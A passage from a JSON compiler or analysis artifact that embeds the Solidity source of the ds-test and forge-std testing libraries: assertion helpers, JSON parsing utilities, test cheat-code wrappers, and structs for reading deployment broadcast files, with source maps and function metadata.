assertLeDecimal(uint a, uint b, uint decimals) internal {\n        if (a > b) {\n            emit log(\"Error: a <= b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Value a\", a, decimals);\n            emit log_named_decimal_uint(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertLeDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a > b) {\n            emit log_named_string(\"Error\", err);\n            assertGeDecimal(a, b, decimals);\n        }\n    }\n\n    function assertEq(string memory a, string memory b) internal {\n        if (keccak256(abi.encodePacked(a)) != keccak256(abi.encodePacked(b))) {\n            emit log(\"Error: a == b not satisfied [string]\");\n            emit log_named_string(\"  Expected\", b);\n            emit log_named_string(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(string memory a, string memory b, string memory err) internal {\n        if (keccak256(abi.encodePacked(a)) != keccak256(abi.encodePacked(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function checkEq0(bytes memory a, bytes memory b) internal pure returns (bool ok) {\n        ok = true;\n        if (a.length == b.length) {\n            for (uint i = 0; i < a.length; i++) {\n                if (a[i] != b[i]) {\n                    ok = false;\n                }\n            }\n        } else {\n            ok = false;\n        }\n    }\n    function assertEq0(bytes memory a, bytes memory b) internal {\n        if (!checkEq0(a, b)) {\n            emit log(\"Error: a == b not satisfied [bytes]\");\n            emit log_named_bytes(\"  Expected\", b);\n            emit log_named_bytes(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq0(bytes memory a, bytes memory b, string memory err) internal {\n        if (!checkEq0(a, b)) {\n            emit log_named_string(\"Error\", err);\n            assertEq0(a, b);\n        }\n    }\n}\n","sourceMap":"715:15435:18:-:0;;;1572:26;;;-1:-1:-1;;1572:26:18;1594:4;1572:26;;;715:15435;;;;;;;;;;;;;;;;","sourceMapDeployed":"715:15435:18:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1819:584;;;:::i;:::-;;;179:14:29;;172:22;154:41;;142:2;127:18;1819:584:18;;;;;;;1572:26;;;;;;;;;1819:584;1853:4;1873:7;;;;;;;1869:528;;;-1:-1:-1;1903:7:18;;;;;;;;1819:584::o;1869:528::-;1941:17;2990:42;2978:55;3059:16;1980:374;;2196:43;;;1671:64;2196:43;;;380:51:29;;;-1:-1:-1;;;447:18:29;;;440:34;2196:43:18;;;;;;;;;353:18:29;;;2196:43:18;;;-1:-1:-1;;1671:64:18;;2086:175;;2135:34;;2086:175;;;:::i;:::-;;;;-1:-1:-1;;2086:175:18;;;;;;;;;;2047:232;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2020:259;;;2323:7;2312:27;;;;;;;;;;;;:::i;:::-;2297:42;;2002:352;1980:374;2374:12;1819:584;-1:-1:-1;1819:584:18:o;485:322:29:-;526:3;564:5;558:12;588:1;598:128;612:6;609:1;606:13;598:128;;;709:4;694:13;;;690:24;;684:31;671:11;;;664:52;627:12;598:128;;;-1:-1:-1;781:1:29;745:16;;770:13;;;-1:-1:-1;745:16:29;;485:322;-1:-1:-1;485:322:29:o;812:278::-;-1:-1:-1;;;;;;997:33:29;;985:46;;967:3;1047:37;1081:1;1072:11;;1064:6;1047:37;:::i;:::-;1040:44;812:278;-1:-1:-1;;;;812:278:29:o;1095:189::-;1224:3;1249:29;1274:3;1266:6;1249:29;:::i;:::-;1242:36;1095:189;-1:-1:-1;;;1095:189:29:o;1289:277::-;1356:6;1409:2;1397:9;1388:7;1384:23;1380:32;1377:52;;;1425:1;1422;1415:12;1377:52;1457:9;1451:16;1510:5;1503:13;1496:21;1489:5;1486:32;1476:60;;1532:1;1529;1522:12","constructor":null,"functions":[{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/lib/ds-test/src/test.sol:DSTest:IS_TEST()(bool)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/lib/ds-test/src/test.sol:DSTest","signature":"IS_TEST():(bool)","shortSignature":"fa7626d4","name":"IS_TEST","inputs":[],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@pwnednomore/contracts/lib/forge-std/lib/ds-test/src/test.sol:DSTest:failed()(bool)","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/lib/ds-test/src/test.sol:DSTest","signature":"failed():(bool)","shortSignature":"ba414fa6","name":"failed","inputs":[],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false}],"functionalLines":[]},{"name":"stdJson","artifactPath":"out/StdJson.sol/stdJson.json","sourcePath":"node_modules/@pwnednomore/contracts/lib/forge-std/src/StdJson.sol","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/StdJson.sol:stdJson","sourceFileId":20,"sourceContent":"// SPDX-License-Identifier: MIT\npragma solidity >=0.6.0 <0.9.0;\npragma experimental ABIEncoderV2;\n\nimport \"./Vm.sol\";\n\n// Helpers for parsing keys into types.\nlibrary stdJson {\n\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    function parseRaw(string memory json, string memory key)\n        internal\n        returns (bytes memory)\n    {\n        return vm.parseJson(json, key);\n    }\n\n    function readUint(string memory json, string memory key)\n        internal\n        returns (uint256)\n    {\n        return abi.decode(vm.parseJson(json, key), (uint256));\n    }\n\n    function readUintArray(string memory json, string memory key)\n        internal\n        returns (uint256[] memory)\n    {\n        return abi.decode(vm.parseJson(json, key), (uint256[]));\n    }\n\n    function readInt(string memory json, string memory key)\n        internal\n        returns (int256)\n    {\n        return abi.decode(vm.parseJson(json, key), (int256));\n    }\n\n    function readIntArray(string memory json, string memory key)\n        internal\n        returns (int256[] memory)\n    {\n        return abi.decode(vm.parseJson(json, key), (int256[]));\n    }\n\n    function readBytes32(string memory json, string memory key)\n        internal\n        returns (bytes32)\n    {\n        return abi.decode(vm.parseJson(json, key), (bytes32));\n    }\n\n    function readBytes32Array(string memory json, string memory key)\n        internal\n        returns (bytes32[] memory)\n    {\n        return abi.decode(vm.parseJson(json, key), (bytes32[]));\n    }\n\n    function readString(string memory json, string memory key)\n        internal\n        returns (string memory)\n    {\n        return abi.decode(vm.parseJson(json, key), (string));\n    }\n\n    function readStringArray(string memory json, string memory key)\n        internal\n        returns (string[] memory)\n    {\n        return abi.decode(vm.parseJson(json, key), (string[]));\n    }\n\n    function readAddress(string memory json, string memory key)\n        internal\n        returns (address)\n    {\n        return abi.decode(vm.parseJson(json, key), (address));\n    }\n\n    function readAddressArray(string memory json, string memory key)\n        internal\n        returns (address[] memory)\n    {\n        return abi.decode(vm.parseJson(json, key), (address[]));\n    }\n\n    function readBool(string memory json, string memory key)\n        internal\n        returns (bool)\n    {\n        return abi.decode(vm.parseJson(json, key), (bool));\n    }\n\n    function readBoolArray(string memory json, string memory key)\n        internal\n        returns (bool[] memory)\n    {\n        return abi.decode(vm.parseJson(json, key), (bool[]));\n    }\n\n    function readBytes(string memory json, string memory key)\n        internal\n        returns (bytes memory)\n    {\n        return abi.decode(vm.parseJson(json, key), (bytes));\n    }\n\n    function readBytesArray(string memory json, string memory key)\n        internal\n        returns (bytes[] memory)\n    {\n        return abi.decode(vm.parseJson(json, key), (bytes[]));\n    }\n\n\n}\n","sourceMap":"159:2908:20:-:0;;;;;;;;;;;;;;;-1:-1:-1;;;159:2908:20;;;;;;;;;;;;;;;;;","sourceMapDeployed":"159:2908:20:-:0;;;;;;;;","constructor":null,"functions":[],"functionalLines":[]},{"name":"stdError","artifactPath":"out/Test.sol/stdError.json","sourcePath":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/Test.sol:stdError","sourceFileId":21,"sourceContent":"// SPDX-License-Identifier: MIT\npragma solidity >=0.6.0 <0.9.0;\npragma experimental ABIEncoderV2;\n\nimport \"./Script.sol\";\nimport \"ds-test/test.sol\";\n\n// Wrappers around Cheatcodes to avoid footguns\nabstract contract Test is DSTest, Script {\n    using stdStorage for StdStorage;\n\n    uint256 internal constant UINT256_MAX =\n        115792089237316195423570985008687907853269984665640564039457584007913129639935;\n\n    StdStorage internal stdstore;\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                    STD-LOGS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    event log_array(uint256[] val);\n    event log_array(int256[] val);\n    event log_array(address[] val);\n    event log_named_array(string key, uint256[] val);\n    event log_named_array(string key, int256[] val);\n    event log_named_array(string key, address[] val);\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                    STD-CHEATS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    // Skip forward or rewind time by the specified number of seconds\n    function skip(uint256 time) internal {\n        vm.warp(block.timestamp + time);\n    }\n\n    function rewind(uint256 time) internal {\n        vm.warp(block.timestamp - time);\n    }\n\n    // Setup a prank from an address that has some ether\n    function hoax(address who) internal {\n        vm.deal(who, 1 << 128);\n        vm.prank(who);\n    }\n\n    function hoax(address who, uint256 give) internal {\n        vm.deal(who, give);\n        vm.prank(who);\n    }\n\n    function hoax(address who, address origin) internal {\n        vm.deal(who, 1 << 128);\n        vm.prank(who, origin);\n    }\n\n    function hoax(address who, address origin, uint256 give) internal {\n        vm.deal(who, give);\n        vm.prank(who, origin);\n    }\n\n    // Start perpetual prank from an address that has some ether\n    function startHoax(address who) internal {\n        vm.deal(who, 1 << 128);\n        vm.startPrank(who);\n    }\n\n    function startHoax(address who, uint256 give) internal {\n        vm.deal(who, give);\n        vm.startPrank(who);\n    }\n\n    // Start perpetual prank from an address that has some ether\n    // tx.origin is set to the origin parameter\n    function startHoax(address who, address origin) internal {\n        vm.deal(who, 1 << 128);\n        vm.startPrank(who, origin);\n    }\n\n    function startHoax(address who, address origin, uint256 give) internal {\n        vm.deal(who, give);\n        vm.startPrank(who, origin);\n    }\n\n    function changePrank(address who) internal {\n        vm.stopPrank();\n        vm.startPrank(who);\n    }\n\n    // creates a labeled address and the corresponding private key\n    function makeAddrAndKey(string memory name) internal returns(address addr, uint256 privateKey) {\n        privateKey = uint256(keccak256(abi.encodePacked(name)));\n        addr = vm.addr(privateKey);\n        vm.label(addr, name);\n    }\n\n    // creates a labeled address\n    function makeAddr(string memory name) internal returns(address addr) {\n        (addr,) = makeAddrAndKey(name);\n    }\n\n    // DEPRECATED: Use `deal` instead\n    function tip(address token, address to, uint256 give) internal {\n        emit log_named_string(\"WARNING\", \"Test tip(address,address,uint256): The `tip` stdcheat has been deprecated. Use `deal` instead.\");\n        stdstore\n            .target(token)\n            .sig(0x70a08231)\n            .with_key(to)\n            .checked_write(give);\n    }\n\n    // The same as Vm's `deal`\n    // Use the alternative signature for ERC20 tokens\n    function deal(address to, uint256 give) internal {\n        vm.deal(to, give);\n    }\n\n    // Set the balance of an account for any ERC20 token\n    // Use the alternative signature to update `totalSupply`\n    function deal(address token, address to, uint256 give) internal {\n        deal(token, to, give, false);\n    }\n\n    function deal(address token, address to, uint256 give, bool adjust) internal {\n        // get current balance\n        (, bytes memory balData) = token.call(abi.encodeWithSelector(0x70a08231, to));\n        uint256 prevBal = abi.decode(balData, (uint256));\n\n        // update balance\n        stdstore\n            .target(token)\n            .sig(0x70a08231)\n            .with_key(to)\n            .checked_write(give);\n\n        // update total supply\n        if(adjust){\n            (, bytes memory totSupData) = token.call(abi.encodeWithSelector(0x18160ddd));\n            uint256 totSup = abi.decode(totSupData, (uint256));\n            if(give < prevBal) {\n                totSup -= (prevBal - give);\n            } else {\n                totSup += (give - prevBal);\n            }\n            stdstore\n                .target(token)\n                .sig(0x18160ddd)\n                .checked_write(totSup);\n        }\n    }\n\n    function bound(uint256 x, uint256 min, uint256 max) internal virtual returns (uint256 result) {\n        require(min <= max, \"Test bound(uint256,uint256,uint256): Max is less than min.\");\n\n        uint256 size = max - min;\n\n        if (size == 0)\n        {\n            result = min;\n        }\n        else if (size == UINT256_MAX)\n        {\n            result = x;\n        }\n        else\n        {\n            ++size; // make `max` inclusive\n            uint256 mod = x % size;\n            result = min + mod;\n        }\n\n        emit log_named_uint(\"Bound Result\", result);\n    }\n\n    // Deploy a contract by fetching the contract bytecode from\n    // the artifacts directory\n    // e.g. `deployCode(code, abi.encode(arg1,arg2,arg3))`\n    function deployCode(string memory what, bytes memory args)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = abi.encodePacked(vm.getCode(what), args);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string,bytes): Deployment failed.\"\n        );\n    }\n\n    function deployCode(string memory what)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = vm.getCode(what);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string): Deployment failed.\"\n        );\n    }\n\n    /// deploy contract with value on construction\n    function deployCode(string memory what, bytes memory args, uint256 val)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = abi.encodePacked(vm.getCode(what), args);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(val, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string,bytes,uint256): Deployment failed.\"\n        );\n    }\n\n    function deployCode(string memory what, uint256 val)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = vm.getCode(what);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(val, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string,uint256): Deployment failed.\"\n        );\n    }\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                    STD-ASSERTIONS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function fail(string memory err) internal virtual {\n        emit log_named_string(\"Error\", err);\n        fail();\n    }\n\n    function assertFalse(bool data) internal virtual {\n        assertTrue(!data);\n    }\n\n    function assertFalse(bool data, string memory err) internal virtual {\n        assertTrue(!data, err);\n    }\n\n    function assertEq(bool a, bool b) internal {\n        if (a != b) {\n            emit log                (\"Error: a == b not satisfied [bool]\");\n            emit log_named_string   (\"  Expected\", b ? \"true\" : \"false\");\n            emit log_named_string   (\"    Actual\", a ? \"true\" : \"false\");\n            fail();\n        }\n    }\n\n    function assertEq(bool a, bool b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEq(bytes memory a, bytes memory b) internal {\n        assertEq0(a, b);\n    }\n\n    function assertEq(bytes memory a, bytes memory b, string memory err) internal {\n        assertEq0(a, b, err);\n    }\n\n    function assertEq(uint256[] memory a, uint256[] memory b) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log(\"Error: a == b not satisfied [uint[]]\");\n            emit log_named_array(\"  Expected\", b);\n            emit log_named_array(\"    Actual\", a);\n            fail();\n        }\n    }\n\n    function assertEq(int256[] memory a, int256[] memory b) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log(\"Error: a == b not satisfied [int[]]\");\n            emit log_named_array(\"  Expected\", b);\n            emit log_named_array(\"    Actual\", a);\n            fail();\n        }\n    }\n\n    function assertEq(address[] memory a, address[] memory b) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log(\"Error: a == b not satisfied [address[]]\");\n            emit log_named_array(\"  Expected\", b);\n            emit log_named_array(\"    Actual\", a);\n            fail();\n        }\n    }\n\n    function assertEq(uint256[] memory a, uint256[] memory b, string memory err) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEq(int256[] memory a, int256[] memory b, string memory err) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n\n    function assertEq(address[] memory a, address[] memory b, string memory err) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEqUint(uint256 a, uint256 b) internal {\n        assertEq(uint256(a), uint256(b));\n    }\n\n    function assertApproxEqAbs(\n        uint256 a,\n        uint256 b,\n        uint256 maxDelta\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log            (\"Error: a ~= b not satisfied [uint]\");\n            emit log_named_uint (\"  Expected\", b);\n            emit log_named_uint (\"    Actual\", a);\n            emit log_named_uint (\" Max Delta\", maxDelta);\n            emit log_named_uint (\"     Delta\", delta);\n            fail();\n        }\n    }\n\n    function assertApproxEqAbs(\n        uint256 a,\n        uint256 b,\n        uint256 maxDelta,\n        string memory err\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log_named_string   (\"Error\", err);\n            assertApproxEqAbs(a, b, maxDelta);\n        }\n    }\n\n    function assertApproxEqAbs(\n        int256 a,\n        int256 b,\n        uint256 maxDelta\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log            (\"Error: a ~= b not satisfied [int]\");\n            emit log_named_int  (\"  Expected\", b);\n            emit log_named_int  (\"    Actual\", a);\n            emit log_named_uint (\" Max Delta\", maxDelta);\n            emit log_named_uint (\"     Delta\", delta);\n            fail();\n        }\n    }\n\n    function assertApproxEqAbs(\n        int256 a,\n        int256 b,\n        uint256 maxDelta,\n        string memory err\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log_named_string   (\"Error\", err);\n            assertApproxEqAbs(a, b, maxDelta);\n        }\n    }\n\n    function assertApproxEqRel(\n        uint256 a,\n        uint256 b,\n        uint256 maxPercentDelta // An 18 decimal fixed point number, where 1e18 == 100%\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log                    (\"Error: a ~= b not satisfied [uint]\");\n            emit log_named_uint         (\"    Expected\", b);\n            emit log_named_uint         (\"      Actual\", a);\n            emit log_named_decimal_uint (\" Max % Delta\", maxPercentDelta, 18);\n            emit log_named_decimal_uint (\"     % Delta\", percentDelta, 18);\n            fail();\n        }\n    }\n\n    function assertApproxEqRel(\n        uint256 a,\n        uint256 b,\n        uint256 maxPercentDelta, // An 18 decimal fixed point number, where 1e18 == 100%\n        string memory err\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b, err); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log_named_string       (\"Error\", err);\n            assertApproxEqRel(a, b, maxPercentDelta);\n        }\n    }\n\n    function assertApproxEqRel(\n        int256 a,\n        int256 b,\n        uint256 maxPercentDelta\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log                   (\"Error: a ~= b not satisfied [int]\");\n            emit log_named_int         (\"    Expected\", b);\n            emit log_named_int         (\"      Actual\", a);\n            emit log_named_decimal_uint(\" Max % Delta\", maxPercentDelta, 18);\n            emit log_named_decimal_uint(\"     % Delta\", percentDelta, 18);\n            fail();\n        }\n    }\n\n    function assertApproxEqRel(\n        int256 a,\n        int256 b,\n        uint256 maxPercentDelta,\n        string memory err\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log_named_string      (\"Error\", err);\n            assertApproxEqRel(a, b, maxPercentDelta);\n        }\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                              JSON PARSING\n    //////////////////////////////////////////////////////////////*/\n\n   // Data structures to parse Transaction objects from the broadcast artifact\n   // that conform to EIP1559. The Raw structs is what is parsed from the JSON\n   // and then converted to the one that is used by the user for better UX.\n\n   struct RawTx1559 {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        // json value name = function\n        string functionSig;\n        bytes32 hash;\n        // json value name = tx\n        RawTx1559Detail txDetail;\n        // json value name = type\n        string opcode;\n    }\n\n    struct RawTx1559Detail {\n        AccessList[] accessList;\n        bytes data;\n        address from;\n        bytes gas;\n        bytes nonce;\n        address to;\n        bytes txType;\n        bytes value;\n    }\n\n    struct Tx1559 {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        string functionSig;\n        bytes32 hash;\n        Tx1559Detail txDetail;\n        string opcode;\n    }\n\n    struct Tx1559Detail {\n        AccessList[] accessList;\n        bytes data;\n        address from;\n        uint256 gas;\n        uint256 nonce;\n        address to;\n        uint256 txType;\n        uint256 value;\n    }\n\n   // Data structures to parse Transaction objects from the broadcast artifact\n   // that DO NOT conform to EIP1559. The Raw structs is what is parsed from the JSON\n   // and then converted to the one that is used by the user for better UX.\n\n    struct TxLegacy{\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        string functionSig;\n        string hash;\n        string opcode;\n        TxDetailLegacy transaction;\n    }\n\n    struct TxDetailLegacy{\n        AccessList[] accessList;\n        uint256 chainId;\n        bytes data;\n        address from;\n        uint256 gas;\n        uint256 gasPrice;\n        bytes32 hash;\n        uint256 nonce;\n        bytes1 opcode;\n        bytes32 r;\n        bytes32 s;\n        uint256 txType;\n        address to;\n        uint8 v;\n        uint256 value;\n    }\n\n    struct AccessList{\n        address accessAddress;\n        bytes32[] storageKeys;\n    }\n\n    // Data structures to parse Receipt objects from the broadcast artifact.\n    // The Raw structs is what is parsed from the JSON\n    // and then converted to the one that is used by the user for better UX.\n\n    struct RawReceipt {\n        bytes32 blockHash;\n        bytes blockNumber;\n        address contractAddress;\n        bytes cumulativeGasUsed;\n        bytes effectiveGasPrice;\n        address from;\n        bytes gasUsed;\n        RawReceiptLog[] logs;\n        bytes logsBloom;\n        bytes status;\n        address to;\n        bytes32 transactionHash;\n        bytes transactionIndex;\n    }\n\n    struct Receipt {\n        bytes32 blockHash;\n        uint256 blockNumber;\n        address contractAddress;\n        uint256 cumulativeGasUsed;\n        uint256 effectiveGasPrice;\n        address from;\n        uint256 gasUsed;\n        ReceiptLog[] logs;\n        bytes logsBloom;\n        uint256 status;\n        address to;\n        bytes32 transactionHash;\n        uint256 transactionIndex;\n    }\n\n    // Data structures to parse the entire broadcast artifact, assuming the\n    // transactions conform to EIP1559.\n\n    struct EIP1559ScriptArtifact {\n        string[] libraries;\n        string path;\n        string[] pending;\n        Receipt[] receipts;\n        uint256 timestamp;\n        Tx1559[] transactions;\n        TxReturn[] txReturns;\n    }\n\n    struct RawEIP1559ScriptArtifact {\n        string[] libraries;\n        string path;\n        string[] pending;\n        RawReceipt[] receipts;\n        TxReturn[] txReturns;\n        uint256 timestamp;\n        RawTx1559[] transactions;\n    }\n\n    struct RawReceiptLog {\n        // json value = address\n        address logAddress;\n        bytes32 blockHash;\n        bytes blockNumber;\n        bytes data;\n        bytes logIndex;\n        bool removed;\n        bytes32[] topics;\n        bytes32 transactionHash;\n        bytes transactionIndex;\n        bytes transactionLogIndex;\n    }\n\n    struct ReceiptLog {\n        // json value = address\n        address logAddress;\n        bytes32 blockHash;\n        uint256 blockNumber;\n        bytes data;\n        uint256 logIndex;\n        bytes32[] topics;\n        uint256 transactionIndex;\n        uint256 transactionLogIndex;\n        bool removed;\n    }\n\n    struct TxReturn {\n        string internalType;\n        string value;\n    }\n\n\n    function readEIP1559ScriptArtifact(string memory path)\n        internal\n        returns(EIP1559ScriptArtifact memory)\n    {\n        string memory data = vm.readFile(path);\n        bytes memory parsedData = vm.parseJson(data);\n        RawEIP1559ScriptArtifact memory rawArtifact = abi.decode(parsedData, (RawEIP1559ScriptArtifact));\n        EIP1559ScriptArtifact memory artifact;\n        artifact.libraries = rawArtifact.libraries;\n        artifact.path = rawArtifact.path;\n        artifact.timestamp = rawArtifact.timestamp;\n        artifact.pending = rawArtifact.pending;\n        artifact.txReturns = rawArtifact.txReturns;\n        artifact.receipts = rawToConvertedReceipts(rawArtifact.receipts);\n        artifact.transactions = rawToConvertedEIPTx1559s(rawArtifact.transactions);\n        return artifact;\n    }\n\n    function rawToConvertedEIPTx1559s(RawTx1559[] memory rawTxs)\n        internal pure\n        returns (Tx1559[] memory)\n    {\n        Tx1559[] memory txs = new Tx1559[](rawTxs.length);\n        for (uint i; i < rawTxs.length; i++) {\n            txs[i] = rawToConvertedEIPTx1559(rawTxs[i]);\n        }\n        return txs;\n    }\n\n    function rawToConvertedEIPTx1559(RawTx1559 memory rawTx)\n        internal pure\n        returns (Tx1559 memory)\n    {\n        Tx1559 memory transaction;\n        transaction.arguments = rawTx.arguments;\n        transaction.contractName = rawTx.contractName;\n        transaction.functionSig = rawTx.functionSig;\n        transaction.hash= rawTx.hash;\n        transaction.txDetail = rawToConvertedEIP1559Detail(rawTx.txDetail);\n        transaction.opcode= rawTx.opcode;\n        return transaction;\n    }\n\n    function rawToConvertedEIP1559Detail(RawTx1559Detail memory rawDetail)\n        internal pure\n        returns (Tx1559Detail memory)\n    {\n        Tx1559Detail memory txDetail;\n        txDetail.data = rawDetail.data;\n        txDetail.from = rawDetail.from;\n        txDetail.to = rawDetail.to;\n        txDetail.nonce = bytesToUint(rawDetail.nonce);\n        txDetail.txType = bytesToUint(rawDetail.txType);\n        txDetail.value = bytesToUint(rawDetail.value);\n        txDetail.gas = bytesToUint(rawDetail.gas);\n        txDetail.accessList = rawDetail.accessList;\n        return txDetail;\n\n    }\n\n    function readTx1559s(string memory path)\n        internal\n        returns (Tx1559[] memory)\n    {\n        string memory deployData = vm.readFile(path);\n        bytes memory parsedDeployData =\n            vm.parseJson(deployData, \".transactions\");\n        RawTx1559[] memory rawTxs = abi.decode(parsedDeployData, (RawTx1559[]));\n        return rawToConvertedEIPTx1559s(rawTxs);\n    }\n\n\n    function readTx1559(string memory path, uint256 index)\n        internal\n        returns (Tx1559 memory)\n    {\n        string memory deployData = vm.readFile(path);\n        string memory key = string(abi.encodePacked(\".transactions[\",vm.toString(index), \"]\"));\n        bytes memory parsedDeployData =\n            vm.parseJson(deployData, key);\n        RawTx1559 memory rawTx = abi.decode(parsedDeployData, (RawTx1559));\n        return rawToConvertedEIPTx1559(rawTx);\n    }\n\n\n    // Analogous to readTransactions, but for receipts.\n    function readReceipts(string memory path)\n        internal\n        returns (Receipt[] memory)\n    {\n        string memory deployData = vm.readFile(path);\n        bytes memory parsedDeployData = vm.parseJson(deployData, \".receipts\");\n        RawReceipt[] memory rawReceipts = abi.decode(parsedDeployData, (RawReceipt[]));\n        return rawToConvertedReceipts(rawReceipts);\n    }\n\n    function readReceipt(string memory path, uint index)\n        internal\n        returns (Receipt memory)\n    {\n        string memory deployData = vm.readFile(path);\n        string memory key = string(abi.encodePacked(\".receipts[\",vm.toString(index), \"]\"));\n        bytes memory parsedDeployData = vm.parseJson(deployData, key);\n        RawReceipt memory rawReceipt = abi.decode(parsedDeployData, (RawReceipt));\n        return rawToConvertedReceipt(rawReceipt);\n    }\n\n    function rawToConvertedReceipts(RawReceipt[] memory rawReceipts)\n        internal pure\n        returns(Receipt[] memory)\n    {\n        Receipt[] memory receipts = new Receipt[](rawReceipts.length);\n        for (uint i; i < rawReceipts.length; i++) {\n            receipts[i] = rawToConvertedReceipt(rawReceipts[i]);\n        }\n        return receipts;\n    }\n\n    function rawToConvertedReceipt(RawReceipt memory rawReceipt)\n        internal pure\n        returns(Receipt memory)\n    {\n        Receipt memory receipt;\n        receipt.blockHash = rawReceipt.blockHash;\n        receipt.to = rawReceipt.to;\n        receipt.from = rawReceipt.from;\n        receipt.contractAddress = rawReceipt.contractAddress;\n        receipt.effectiveGasPrice = bytesToUint(rawReceipt.effectiveGasPrice);\n        receipt.cumulativeGasUsed= bytesToUint(rawReceipt.cumulativeGasUsed);\n        receipt.gasUsed = bytesToUint(rawReceipt.gasUsed);\n        receipt.status = bytesToUint(rawReceipt.status);\n        receipt.transactionIndex = bytesToUint(rawReceipt.transactionIndex);\n        receipt.blockNumber = bytesToUint(rawReceipt.blockNumber);\n        receipt.logs = rawToConvertedReceiptLogs(rawReceipt.logs);\n        receipt.logsBloom = rawReceipt.logsBloom;\n        receipt.transactionHash = rawReceipt.transactionHash;\n        return receipt;\n    }\n\n    function rawToConvertedReceiptLogs(RawReceiptLog[] memory rawLogs)\n        internal pure\n        returns (ReceiptLog[] memory)\n    {\n        ReceiptLog[] memory logs = new ReceiptLog[](rawLogs.length);\n        for (uint i; i < rawLogs.length; i++) {\n            logs[i].logAddress = rawLogs[i].logAddress;\n            logs[i].blockHash = rawLogs[i].blockHash;\n            logs[i].blockNumber = bytesToUint(rawLogs[i].blockNumber);\n            logs[i].data = rawLogs[i].data;\n            logs[i].logIndex = bytesToUint(rawLogs[i].logIndex);\n            logs[i].topics = rawLogs[i].topics;\n            logs[i].transactionIndex = bytesToUint(rawLogs[i].transactionIndex);\n            logs[i].transactionLogIndex = bytesToUint(rawLogs[i].transactionLogIndex);\n            logs[i].removed = rawLogs[i].removed;\n        }\n        return logs;\n\n    }\n\n    function bytesToUint(bytes memory b) internal pure returns (uint256){\n            uint256 number;\n            for (uint i=0; i < b.length; 